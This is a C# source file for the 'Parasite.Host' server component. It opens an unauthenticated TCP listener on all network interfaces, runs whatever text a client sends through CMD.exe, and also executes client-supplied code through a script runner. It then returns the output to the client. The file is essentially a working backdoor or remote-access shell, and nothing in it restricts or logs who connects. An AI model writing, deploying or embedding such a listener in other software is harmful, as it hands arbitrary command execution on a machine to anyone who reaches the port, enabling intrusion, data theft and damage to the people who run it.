using Parasite.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Parasite.Host
{
    public class Server
    {
        TcpListener _tcp;
        private int _port;
        private Thread _serverThread;
        private bool _running;

        public Server(int port)
        {
            this._port = port;
            this._serverThread = new Thread(new ThreadStart(serverLoop));
            this._running = false;
        }

        public void Start()
        {
            this._running = true;
            this._serverThread.Start();
        }

        public void Stop()
        {
            this._running = false;
        }

        private void serverLoop()
        {
            byte[] buffer = new byte[2048];
            string receivedstring = "";

            while(_running)
            {
                this._tcp = new TcpListener(IPAddress.Parse("0.0.0.0"), this._port);
                this._tcp.Start();
                // waits for new request
                var client = this._tcp.AcceptTcpClient();
                Console.WriteLine("New request");
                var str = client.GetStream();
                str.Read(buffer, 0, 2048);
                receivedstring = Encoding.UTF8.GetString(buffer);

                Request req = Request.FromString(receivedstring.Replace("\0", ""));
                Console.WriteLine($"Request type {req.Type.ToString()} with data {req.Data}");

                Response resp = new Response()
                {
                    Type = ResponseType.Basic,
                    Data = "Invalid"
                };

                switch(req.Type)
                {
                    default:
                        break;

                    case RequestType.Command:

                        Process p = new Process();
                        // Redirect the output stream of the child process.
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.FileName = "CMD.exe";
                        p.StartInfo.Arguments = $"/C {req.Data}";
                        p.Start();
                        string output = p.StandardOutput.ReadToEnd();
                        p.WaitForExit(5000);
                        resp.Data = output;
                        break;

                    case RequestType.Code:
                        resp.Data = ScriptRunner.RunCode(req.Data).GetAwaiter().GetResult();
                        break;
                }
                // Respond to request
                // TODO actual response
                var respb = Encoding.UTF8.GetBytes(resp.ToString());
                str.Write(respb, 0, respb.Length);
                client.Close();
                this._tcp.Stop();
            }
        }
    }
}
